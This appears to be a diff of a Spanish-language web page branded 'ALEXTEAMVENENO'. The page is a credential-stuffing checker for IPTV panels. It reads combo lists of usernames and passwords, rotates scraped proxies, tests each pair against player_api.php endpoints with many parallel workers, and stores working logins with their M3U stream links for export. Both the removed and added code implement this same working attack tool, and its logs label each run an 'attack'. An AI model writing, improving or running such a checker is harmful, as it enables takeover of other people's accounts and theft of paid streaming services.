-        setInterval(() => { if (isLoggedIn && !state.isRunning) saveState(); }, 15000);
-
-        // ==================== GUARDADO EN ARCHIVOS ====================
-        function saveHitToFile(portal, user, pass, m3u, canales, espana) {
-            const now = new Date();
-            const dateStr = now.toISOString().split('T')[0];
-            const timeStr = now.toLocaleTimeString('es-ES', {hour12: false});
-            const hitLine = `${user}:${pass} | CH:${canales||0} | ESP:${espana||0} | ${m3u} | ${dateStr} ${timeStr}\n`;
-            const panelFile = 'Hits/' + portal.replace(/[:/.]/g, '_') + '.txt';
-            appendToStorage(panelFile, hitLine);
-            appendToStorage('Hits/TODOS_LOS_HITS.txt', hitLine);
-            appendToStorage('Hits/USERPASS.txt', `${user}:${pass}\n`);
-        }
-
-        function appendToStorage(filename, content) {
-            try {
-                const existing = localStorage.getItem('f_' + filename) || '';
-                const updated = existing + content;
-                if (updated.length < 4000000) {
-                    localStorage.setItem('f_' + filename, updated);
-                } else {
-                    localStorage.setItem('f_' + filename, existing.slice(-2000000) + content);
-                }
-            } catch(e) {}
-        }
-
-        function loadExistingFiles() {
-            const allHits = localStorage.getItem('f_Hits/TODOS_LOS_HITS.txt') || '';
-            const lines = allHits.split('\n').filter(l => l.trim());
-            if (lines.length > 0) {
-                log(`📁 ${lines.length} hits guardados en archivos`, 'i');
-            }
-        }
-
-        function downloadAllFiles() {
-            const keys = Object.keys(localStorage).filter(k => k.startsWith('f_Hits/'));
-            if (keys.length === 0) { showToast('⚠️ No hay archivos', 'err'); return; }
-            let allContent = '☢️ ALEXTEAMVENENO · HITS\n' + '='.repeat(40) + '\n\n';
-            keys.forEach(key => {
-                const filename = key.replace('f_', '');
-                const content = localStorage.getItem(key);
-                if (content) {
-                    allContent += `📁 ${filename}\n${'─'.repeat(30)}\n${content}\n\n`;
-                }
-            });
-            const blob = new Blob([allContent], {type: 'text/plain'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url; a.download = `ALEXTEAMVENENO_HITS_${new Date().toISOString().split('T')[0]}.txt`;
-            document.body.appendChild(a); a.click(); document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast(`📥 ${keys.length} archivos descargados`);
-            log(`📥 ${keys.length} archivos descargados`, 'h');
-        }
-
-        // ==================== UI ====================
-        function log(msg, type) {
-            if (!isLoggedIn) return;
-            if (type === 'i' && !document.getElementById('logInfo').checked) return;
-            if (type === 'h' && !document.getElementById('logHits').checked) return;
-            if (type === 'e' && !document.getElementById('logErrors').checked) return;
-            const el = document.getElementById('console');
-            const line = document.createElement('div');
-            line.className = type;
-            line.textContent = `[${new Date().toLocaleTimeString('en-US',{hour12:false})}] ${msg}`;
-            el.appendChild(line);
-            el.scrollTop = el.scrollHeight;
-            if (el.children.length > 50) el.removeChild(el.firstChild);
-        }
-
-        function showToast(msg, type) {
-            const t = document.getElementById('toast');
-            t.textContent = msg; t.className = 'toast ' + (type || '') + ' show';
-            clearTimeout(t._t); t._t = setTimeout(() => t.classList.remove('show'), 2000);
-        }
-
-        function updateStats() {
-            const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = v; };
-            set('statChecked', state.stats.checked);
-            set('statHits', state.stats.hits);
-            set('statErrors', state.stats.errors);
-            set('hitCount', state.hits.length);
-            const pct = state.totalCombos > 0 ? (state.stats.checked / state.totalCombos * 100) : 0;
-            document.getElementById('progressFill').style.width = pct + '%';
-            set('progressText', `[ ${state.stats.checked} / ${state.totalCombos} ] ${pct.toFixed(1)}%`);
-            document.getElementById('btnDownloadAll').disabled = state.hits.length === 0;
-        }
-
-        function renderHitCard(hitData) {
-            state.hits.push(hitData);
-            const container = document.getElementById('hitsContainer');
-            if (container.querySelector('.empty')) container.innerHTML = '';
-            
-            const card = document.createElement('div');
-            card.className = 'hit-card';
-            card.onclick = () => showHitDetails(hitData);
-            
-            const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;');
-            card.innerHTML = `
-                <div class="hit-top">
-                    <div>
-                        <span class="hit-user">${esc(hitData.user)}</span>
-                        <span class="hit-pass">:${esc(hitData.pass)}</span>
-                    </div>
-                    <span style="font-size:0.65em;color:var(--muted);">${hitData.status||'Active'}</span>
-                </div>
-                <div class="hit-panel">🌐 ${esc(hitData.portal)} | 📅 ${esc(hitData.exp||'N/A')}</div>
-                <div class="hit-info">
-                    <span>📺 ${hitData.canales||0}</span>
-                    <span>🇪🇸 ${hitData.espana||0}</span>
-                </div>
-                <div class="hit-actions">
-                    <button class="hit-copy-btn" onclick="event.stopPropagation();copyText('${esc(hitData.user)}:${esc(hitData.pass)}')">📋 USER:PASS</button>
-                    <button class="hit-copy-btn" onclick="event.stopPropagation();copyText('${esc(hitData.m3u||'')}')">📋 M3U</button>
-                </div>
-            `;
-            container.insertBefore(card, container.firstChild);
-        }
-
-        function showHitDetails(hitData) {
-            const modal = document.getElementById('modalCats');
-            const content = document.getElementById('modalContent');
-            content.innerHTML = `
-                <p><b>👤 User:</b> ${hitData.user}</p>
-                <p><b>🔑 Pass:</b> ${hitData.pass}</p>
-                <p><b>🌐 Panel:</b> ${hitData.portal}</p>
-                <p><b>🟢 Status:</b> ${hitData.status||'Active'}</p>
-                <p><b>📅 Exp:</b> ${hitData.exp||'N/A'}</p>
-                <p><b>📺 Canales:</b> ${hitData.canales||0} | <b>🇪🇸 España:</b> ${hitData.espana||0}</p>
-                <p><b>🎬 Movies:</b> ${hitData.pelis||0} | <b>🍿 Series:</b> ${hitData.series||0}</p>
-                <p><b>🔗 M3U:</b> <span style="color:var(--cyan);word-break:break-all;">${hitData.m3u||'N/A'}</span></p>
-                ${hitData.categories && hitData.categories.length > 0 ? `
-                <p><b>📂 Categorías (${hitData.categories.length}):</b></p>
-                ${hitData.categories.map(c => `<span class="cat-tag">${c}</span>`).join(' ')}
-                ` : '<p><b>📂 Categorías:</b> No disponibles</p>'}
-            `;
-            modal.classList.add('show');
-        }
-
-        function closeModal() { document.getElementById('modalCats').classList.remove('show'); }
-
-        function copyText(text) {
-            if (navigator.clipboard) {
-                navigator.clipboard.writeText(text).then(() => showToast('✅ Copiado!'));
-            } else {
-                const ta = document.createElement('textarea');
-                ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
-                document.body.appendChild(ta); ta.select();
-                document.execCommand('copy'); document.body.removeChild(ta);
-                showToast('✅ Copiado!');
-            }
-        }
-
-        // ==================== FILE HANDLERS ====================
-        function handleComboFile(e) {
-            const f = e.target.files[0]; if (!f) return;
-            const r = new FileReader();
-            r.onload = ev => {
-                state.comboLines = ev.target.result.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
-                state.totalCombos = state.comboLines.length;
-                state.stats = { checked: 0, hits: 0, errors: 0 };
-                state.hits = []; state.totalChannels = 0; state.totalSpain = 0;
-                document.getElementById('hitsContainer').innerHTML = '<div class="empty">👆 Carga un combo y despliega el ataque</div>';
-                document.getElementById('comboStatus').textContent = `${state.totalCombos} combos`;
-                updateStats(); saveState();
-                showToast(`✅ ${state.totalCombos} combos cargados`);
+    // ========== AUTO-SAVE HITS (LOCALSTORAGE) ==========
+    function saveHitsToLocalStorage() {
+        try {
+            const dataToStore = {
+                hits: hitsArray,
+                totalChannels: totalChannels,
+                totalSpain: totalSpain,
+                lastUpdate: Date.now()
             };
-            r.readAsText(f);
-        }
+            localStorage.setItem('alex_hits_db', JSON.stringify(dataToStore));
+            console.log('✅ Hits guardados automáticamente en localStorage');
+        } catch(e) { console.warn(e); }
+    }
 
-        function handleProxyFile(e) {
-            const f = e.target.files[0]; if (!f) return;
-            const r = new FileReader();
-            r.onload = ev => {
-                state.proxies = ev.target.result.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
-                document.getElementById('proxyStatus').textContent = `${state.proxies.length} proxies`;
-                saveState();
-                showToast(`✅ ${state.proxies.length} proxies cargados`);
-            };
-            r.readAsText(f);
-        }
-
-        async function scrapeProxies() {
-            const btn = document.getElementById('btnScrape');
-            btn.disabled = true; btn.textContent = '⏳...';
-            log('📥 Scraping proxies...', 'i');
-            const sources = [
-                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
-                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt'
-            ];
-            const all = [];
-            for (const url of sources) {
-                try {
-                    const r = await fetch(getNextCorsProxy() + encodeURIComponent(url));
-                    const txt = await r.text();
-                    (txt.match(/\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b/g) || []).forEach(m => all.push(m));
-                } catch(e) {}
+    function loadHitsFromLocalStorage() {
+        try {
+            const stored = localStorage.getItem('alex_hits_db');
+            if (stored) {
+                const data = JSON.parse(stored);
+                if (data.hits && Array.isArray(data.hits)) {
+                    hitsArray = data.hits;
+                    totalChannels = data.totalChannels || 0;
+                    totalSpain = data.totalSpain || 0;
+                    renderHitsTable();
+                    updateStatsUI();
+                    log(`📀 Cargados ${hitsArray.length} hits desde almacenamiento local`, 'info');
+                }
             }
-            state.proxies = [...new Set(all)].slice(0, 500);
-            document.getElementById('proxyStatus').textContent = `${state.proxies.length} proxies`;
-            log(`✅ ${state.proxies.length} proxies scrapeados`, 'h');
-            saveState();
-            btn.disabled = false; btn.textContent = '🌐 SCRAPE';
-            showToast(`✅ ${state.proxies.length} proxies`);
-        }
+        } catch(e) { console.warn(e); }
+    }
 
-        // ==================== CHECKER ====================
-        async function checkCombo(line, portals, https) {
-            const parts = line.split(':');
-            if (parts.length < 2) return { invalid: true };
-            const user = parts[0].trim();
-            const pass = parts.slice(1).join(':').trim();
-            if (!user || !pass) return { invalid: true };
-            const proto = https ? 'https' : 'http';
-            
-            for (const portal of portals) {
-                if (!state.isRunning) return null;
-                const cp = portal.replace(/^https?:\/\//, '').replace(/\/$/, '');
-                const base = `${proto}://${cp}`;
+    function renderHitsTable() {
+        const tbody = document.getElementById('hitsBody');
+        if (!tbody) return;
+        tbody.innerHTML = '';
+        hitsArray.slice().reverse().forEach(hit => {
+            const row = tbody.insertRow();
+            row.innerHTML = `
+                <td style="max-width:120px; overflow:hidden; text-overflow:ellipsis;">${escapeHtml(hit.user)}</td>
+                <td style="max-width:100px; overflow:hidden;">${escapeHtml(hit.pass)}</td>
+                <td style="max-width:120px; overflow:hidden;">${escapeHtml(hit.portal)}</td>
+                <td style="text-align:center;">${hit.canales||0}</td>
+                <td style="text-align:center; color:#ff6a00;">${hit.espana||0}</td>
+                <td><div class="m3u-cell"><span class="m3u-link-text">${escapeHtml(hit.m3u||'')}</span><button class="btn-copy-m3u">📋</button></div></td>
+            `;
+            row.onclick = () => showModal(hit);
+            const copyBtn = row.querySelector('.btn-copy-m3u');
+            if(copyBtn) copyBtn.onclick = (e) => { e.stopPropagation(); copyToClipboard(hit.m3u || ''); showToast('✅ M3U copiado'); };
+        });
+        document.getElementById('statChannels').innerText = totalChannels;
+        document.getElementById('statSpain').innerText = totalSpain;
+    }
+
+    function addHitToTable(hitData) {
+        hitsArray.unshift(hitData);
+        totalChannels += (hitData.canales || 0);
+        totalSpain += (hitData.espana || 0);
+        renderHitsTable();
+        updateStatsUI();
+        saveHitsToLocalStorage();  // AUTO-GUARDADO INMEDIATO
+        log(`💥 HIT! ${hitData.user}:${hitData.pass} | 📺 ${hitData.canales} | 🇪🇸 ${hitData.espana}`, 'hit');
+    }
+
+    function clearHits() {
+        if(confirm('⚠️ Borrar TODOS los hits? Esta acción es permanente.')) {
+            hitsArray = [];
+            totalChannels = 0;
+            totalSpain = 0;
+            renderHitsTable();
+            saveHitsToLocalStorage();
+            showToast('🗑️ Hits eliminados');
+            log('Base de hits limpiada', 'warn');
+        }
+    }
+
+    function saveHitsToTxt() {
+        if(hitsArray.length === 0) { showToast('⚠️ No hay hits para guardar'); return; }
+        let content = `ALEXTEAMVENENO · HITS REPORT\n${new Date().toISOString()}\nTotal: ${hitsArray.length}\n━━━━━━━━━━━━━━━━━━━━\n`;
+        hitsArray.forEach((h,i) => {
+            content += `#${i+1} 👤 ${h.user} 🔑 ${h.pass}\n🌐 ${h.portal}\n📺 ${h.canales} | 🇪🇸 ${h.espana}\n🔗 ${h.m3u}\n━━━━━━━━━━━━━━━━━━━━\n`;
+        });
+        const blob = new Blob([content], {type: 'text/plain'});
+        const a = document.createElement('a');
+        const url = URL.createObjectURL(blob);
+        a.href = url;
+        a.download = `ALEX_HITS_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        showToast('💾 Archivo guardado');
+    }
+
+    // ========== FUNCIONES AUX ==========
+    function escapeHtml(str) { if(!str) return ''; return String(str).replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
+    function copyToClipboard(text) { navigator.clipboard.writeText(text).catch(()=>{prompt('Copia manual:', text);}); }
+    function showToast(msg) { const t=document.getElementById('toast'); t.innerText=msg; t.style.display='block'; setTimeout(()=>t.style.display='none', 2000); }
+    function log(msg, type='info') { const c=document.getElementById('console'); if(!c) return; const line=document.createElement('div'); line.className=`log-${type}`; line.innerText=`[${new Date().toLocaleTimeString()}] ${msg}`; c.appendChild(line); c.scrollTop=c.scrollHeight; }
+    function updateStatsUI() {
+        document.getElementById('statChecked').innerText = stats.checked;
+        document.getElementById('statHits').innerText = stats.hits;
+        document.getElementById('statErrors').innerText = stats.errors;
+        const rate = stats.checked>0 ? ((stats.hits/stats.checked)*100).toFixed(2) : '0';
+        document.getElementById('statRate').innerText = `${rate}%`;
+        if(totalCombos>0) {
+            const pct = (stats.checked/totalCombos)*100;
+            document.getElementById('progressFill').style.width = `${pct}%`;
+        }
+        if(startTime>0 && stats.checked>0){
+            const elapsed = (Date.now()-startTime)/1000;
+            const cpm = Math.floor((stats.checked/elapsed)*60);
+            document.getElementById('statCPM').innerText = cpm;
+            const remaining = totalCombos - stats.checked;
+            const eta = remaining / (stats.checked/elapsed);
+            const m = Math.floor(eta/60), s = Math.floor(eta%60);
+            document.getElementById('statETA').innerText = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        }
+    }
+
+    // ========== SCANNER IPTV ==========
+    async function checkCombo(line, portals, https, proxy) {
+        const parts = line.split(':');
+        if(parts.length<2) return null;
+        const user = parts[0].trim(), pass = parts.slice(1).join(':').trim();
+        if(!user || !pass) return null;
+        const proto = https ? 'https' : 'http';
+        for(let portal of portals){
+            if(!isRunning) return null;
+            const cp = portal.replace(/^https?:\/\//,'').replace(/\/$/,'');
+            const base = `${proto}://${cp}`;
+            for(let retry=0; retry<2; retry++){
                 try {
-                    const ctrl = new AbortController();
-                    setTimeout(() => ctrl.abort(), 12000);
-                    const targetUrl = `${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-                    const r = await fetch(getNextCorsProxy() + encodeURIComponent(targetUrl), {
-                        signal: ctrl.signal,
-                        headers: { 'User-Agent': getRandomUA() }
-                    });
-                    if (r.ok) {
-                        const txt = await r.text();
-                        if (txt.toLowerCase().includes('active') || txt.toLowerCase().includes('exp_date')) {
-                            let d = {}; try { d = JSON.parse(txt); } catch(e) {}
-                            const ui = d.user_info || {};
-                            const exp = ui.exp_date ? new Date(parseInt(ui.exp_date)*1000).toISOString().split('T')[0] : 'N/A';
-                            let cats = [], can = 0, esp = 0, pel = 0, ser = 0;
-                            try {
-                                const cr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`));
-                                if (cr.ok) { const cd = await cr.json(); if (Array.isArray(cd)) cats = cd.map(c => c.category_name || 'Sin nombre'); }
-                            } catch(e) {}
-                            try {
-                                const lr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_streams`));
-                                if (lr.ok) { const ld = await lr.json(); if (Array.isArray(ld)) { can = ld.length; esp = ld.filter(c => { const n = (c.name||'').toLowerCase(); return n.includes('es ') || n.includes('espa'); }).length; } }
-                            } catch(e) {}
-                            try {
-                                const vr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_vod_streams`));
-                                if (vr.ok) { const vd = await vr.json(); if (Array.isArray(vd)) pel = vd.length; }
-                            } catch(e) {}
-                            try {
-                                const sr = await fetch(getNextCorsProxy() + encodeURIComponent(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_series`));
-                                if (sr.ok) { const sd = await sr.json(); if (Array.isArray(sd)) ser = sd.length; }
-                            } catch(e) {}
-                            
+                    const controller = new AbortController();
+                    const timeout = setTimeout(()=>controller.abort(), 10000);
+                    const res = await fetch(`${base}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`, { signal: controller.signal, headers: { 'User-Agent': 'VLC/3.0.20' } });
+                    clearTimeout(timeout);
+                    if(res.status===200){
+                        const txt = await res.text();
+                        if(txt.includes('active') || txt.includes('exp_date')){
+                            let json = {}; try{ json=JSON.parse(txt); }catch(e){}
+                            const exp = json.user_info?.exp_date ? new Date(parseInt(json.user_info.exp_date)*1000).toISOString().split('T')[0] : 'N/A';
+                            let canales=0, espana=0;
+                            try{
+                                const liveRes = await fetch(`${base}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`, { signal: AbortSignal.timeout(7000) });
+                                if(liveRes.ok){
+                                    const live = await liveRes.json();
+                                    if(Array.isArray(live)) { canales = live.length; espana = live.filter(c=> (c.name||'').toLowerCase().includes('es ') || (c.category_name||'').toLowerCase().includes('es')).length; }
+                                }
+                            }catch(e){}
                             const m3u = `${base}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
-                            return {
-                                hit: true,
-                                data: { user, pass, exp, status: ui.status||'Active', maxConn: ui.max_connections, actConn: ui.active_cons, portal: cp, m3u, canales: can, espana: esp, pelis: pel, series: ser, categories: cats, proxy: 'Direct' }
-                            };
+                            return { hit: true, data: { user, pass, exp, portal: cp, m3u, canales, espana, pelis:0, series:0, categories:[] } };
                         }
-                    }
-                    return { error: true };
-                } catch(e) { return { error: true }; }
+                    } else break;
+                } catch(e){ continue; }
             }
-            return { invalid: true };
         }
+        return null;
+    }
 
-        async function startScan() {
-            if (!isLoggedIn || state.isRunning || !state.comboLines.length) {
-                if (!state.comboLines.length) showToast('⚠️ Carga un combo primero', 'err');
-                return;
-            }
-            const raw = document.getElementById('portals').value.trim();
-            if (!raw) { showToast('⚠️ Ingresa URL del panel', 'err'); return; }
-            const portals = raw.split(',').map(p => p.trim()).filter(Boolean);
-            if (!portals.length) return;
-            const threads = Math.min(parseInt(document.getElementById('threads').value) || 20, 30);
-            const useHttps = document.getElementById('useHttps').checked;
+    async function startScan(){
+        if(!isLoggedIn) return;
+        if(comboLines.length===0){ showToast('⚠️ Carga un archivo de combos'); return; }
+        const rawPortals = document.getElementById('portals').value.trim();
+        if(!rawPortals){ showToast('⚠️ Ingresa URLs de paneles'); return; }
+        const portals = rawPortals.split(',').map(p=>p.trim()).filter(Boolean);
+        const threads = Math.min(parseInt(document.getElementById('threads').value)||20, 60);
+        const useHttps = document.getElementById('useHttps').checked;
+        const useProxies = document.getElementById('useProxies').checked && proxies.length>0;
+        if(isRunning) return;
+        isRunning = true;
+        stats = { checked:0, hits:0, errors:0 };
+        totalCombos = comboLines.length;
+        startTime = Date.now();
+        document.getElementById('btnStart').disabled = true;
+        document.getElementById('btnStop').disabled = false;
+        log('🚀 ATAQUE INICIADO [ALEXTEAMVENENO]', 'warn');
+        const queue = [...comboLines];
+        let index = 0;
 
-            state.isRunning = true;
-            state.stats = { checked: 0, hits: 0, errors: 0 };
-            state.hits = [];
-            state.totalChannels = 0;
-            state.totalSpain = 0;
-            state.startTime = Date.now();
-            document.getElementById('hitsContainer').innerHTML = '';
-            document.getElementById('btnStart').disabled = true;
-            document.getElementById('btnStop').disabled = false;
-            
-            log('🚀 ATAQUE INICIADO', 'h');
-            
-            const queue = [...state.comboLines];
-            let qi = 0;
-            const total = queue.length;
-            
-            const worker = async () => {
-                while (state.isRunning && qi < total) {
-                    const ci = qi++;
-                    if (ci >= total) break;
-                    const line = queue[ci];
-                    if (!line || !line.includes(':')) { state.stats.checked++; continue; }
-                    const res = await checkCombo(line, portals, useHttps);
-                    state.stats.checked++;
-                    if (res?.hit) {
-                        state.stats.hits++;
-                        state.totalChannels += (res.data.canales || 0);
-                        state.totalSpain += (res.data.espana || 0);
-                        renderHitCard(res.data);
-                        saveHitToFile(res.data.portal, res.data.user, res.data.pass, res.data.m3u, res.data.canales, res.data.espana);
-                        log(`💥 HIT! ${res.data.user}:${res.data.pass} @ ${res.data.portal}`, 'h');
-                    } else if (res?.error) {
-                        state.stats.errors++;
-                        if (state.stats.errors % 20 === 0) log(`❌ ${state.stats.errors} errores`, 'e');
-                    }
-                    if (state.stats.checked % 10 === 0) updateStats();
-                    if (state.stats.checked % 30 === 0) await new Promise(r => setTimeout(r, 100));
+        async function worker(){
+            while(isRunning && index < queue.length){
+                const i = index++;
+                const line = queue[i];
+                if(!line || !line.includes(':')) { stats.checked++; updateStatsUI(); continue; }
+                const proxy = useProxies && proxies.length ? proxies[proxyIndex++ % proxies.length] : null;
+                const result = await checkCombo(line, portals, useHttps, proxy);
+                stats.checked++;
+                if(result && result.hit){
+                    stats.hits++;
+                    addHitToTable(result.data);
+                } else {
+                    stats.errors++;
                 }
-            };
-            
-            await Promise.all(Array(Math.min(threads, total)).fill().map(() => worker()));
-            
-            state.isRunning = false;
-            document.getElementById('btnStart').disabled = false;
-            document.getElementById('btnStop').disabled = true;
-            updateStats();
-            saveState();
-            const elapsed = ((Date.now() - state.startTime)/1000).toFixed(1);
-            log(`🎯 FIN en ${elapsed}s | Hits: ${state.stats.hits} | Errores: ${state.stats.errors}`, 'h');
-            showToast(`✅ ${state.stats.hits} hits encontrados`);
+                if(stats.checked % 5 === 0) updateStatsUI();
+                await new Promise(r => setTimeout(r, 5));
+            }
         }
 
-        function stopScan() {
-            state.isRunning = false;
-            document.getElementById('btnStop').disabled = true;
-            document.getElementById('btnStart').disabled = false;
-            saveState();
-            log('⬛ ESCANEO DETENIDO', 'i');
-        }
+        const workers = Array(Math.min(threads, queue.length)).fill().map(() => worker());
+        await Promise.all(workers);
+        isRunning = false;
+        document.getElementById('btnStart').disabled = false;
+        document.getElementById('btnStop').disabled = true;
+        updateStatsUI();
+        log(`✅ ATAQUE FINALIZADO | Hits: ${stats.hits} | Canales totales: ${totalChannels}`, 'warn');
+    }
 
-        // ==================== INIT ====================
-        function init() {
-            document.getElementById('dashboard').style.display = 'none';
-            document.getElementById('welcomeScreen').style.display = 'none';
-            document.getElementById('loginScreen').style.display = 'flex';
-            document.getElementById('loginUser').focus();
+    function stopScan(){ isRunning = false; log('⬛ ATAQUE DETENIDO', 'warn'); }
+
+    // ========== MANEJO ARCHIVOS ==========
+    function handleComboFile(e){
+        const file = e.target.files[0];
+        if(!file) return;
+        const reader = new FileReader();
+        reader.onload = function(ev){
+            comboLines = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l.includes(':'));
+            totalCombos = comboLines.length;
+            stats = { checked:0, hits:0, errors:0 };
+            document.getElementById('comboStatus').innerText = `${comboLines.length} cuentas`;
+            log(`✅ ${comboLines.length} combos cargados`, 'info');
+            updateStatsUI();
+        };
+        reader.readAsText(file);
+    }
+    function handleProxyFile(e){
+        const file = e.target.files[0];
+        if(!file) return;
+        const reader = new FileReader();
+        reader.onload = function(ev){
+            const lines = ev.target.result.split('\n').map(l=>l.trim()).filter(l=>l && !l.startsWith('#'));
+            proxies = lines.map(l=> {
+                if(!l.includes('://')) return `http://${l}`;
+                return l;
+            });
+            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies`;
+            log(`🌐 ${proxies.length} proxies cargados`, 'info');
+        };
+        reader.readAsText(file);
+    }
+    async function scrapeProxies(){
+        const btn=document.getElementById('btnScrape');
+        btn.innerText='⏳';
+        try{
+            const res=await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all');
+            const txt=await res.text();
+            const raw=txt.split('\n').filter(l=>l.trim().match(/\d+\.\d+\.\d+\.\d+:\d+/));
+            proxies = raw.map(p=>`http://${p}`).slice(0,150);
+            document.getElementById('proxyStatus').innerText = `${proxies.length} proxies`;
+            log(`✅ ${proxies.length} proxies scrapeados`, 'hit');
+        } catch(e){ log('Error scrapeando proxies', 'err'); }
+        btn.innerText='🌐 SCRAPEAR';
+    }
+
+    // ========== LOGIN / IDIOMA / MODAL ==========
+    function doLogin(){
+        const user = document.getElementById('loginUser').value.trim();
+        const pass = document.getElementById('loginPass').value;
+        if(user === VALID_USER && pass === VALID_PASS){
+            isLoggedIn = true;
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            loadHitsFromLocalStorage();
+            log('🔓 Acceso concedido. DRAGÓN LISTO', 'hit');
+            showToast('✅ Bienvenido ALEX');
+        } else {
+            document.getElementById('loginError').style.display = 'block';
         }
-        window.addEventListener('DOMContentLoaded', init);
-        if (document.readyState !== 'loading') init();
-    </script>
+    }
+    function doLogout(){ if(confirm('¿Cerrar sesión?')){ isRunning=false; isLoggedIn=false; document.getElementById('dashboard').style.display='none'; document.getElementById('loginScreen').style.display='flex'; } }
+    function toggleLang(){ currentLang = currentLang==='es'?'en':'es'; document.getElementById('langIndicator').innerText = currentLang==='es'?'🇪🇸':'🇬🇧'; showToast(`Idioma: ${currentLang==='es'?'Español':'English'}`); }
+    let currentModalHit=null;
+    function showModal(hit){ currentModalHit=hit; const div=document.getElementById('modalHitInfo'); div.innerHTML=`👤 ${hit.user}<br>🔑 ${hit.pass}<br>🌐 ${hit.portal}<br>📺 ${hit.canales} canales | 🇪🇸 ${hit.espana}<br>📅 Exp: ${hit.exp||'N/A'}`;
+        document.getElementById('m3uModalLink').innerText=hit.m3u||'No link'; document.getElementById('m3uModal').style.display='flex'; }
+    function closeModal(e){ if(!e || e.target===document.getElementById('m3uModal')) document.getElementById('m3uModal').style.display='none'; }
+    function copyM3uFromModal(){ if(currentModalHit) copyToClipboard(currentModalHit.m3u||''); showToast('📋 M3U copiado'); }
+    function copyAllDetails(){ if(currentModalHit){ const txt=`${currentModalHit.user}:${currentModalHit.pass}\nPanel: ${currentModalHit.portal}\nM3U: ${currentModalHit.m3u}`; copyToClipboard(txt); showToast('✅ Copiado todo'); } }
+
+    window.onload = () => { document.getElementById('loginScreen').style.display = 'flex'; };
+</script>
 </body>
 </html>
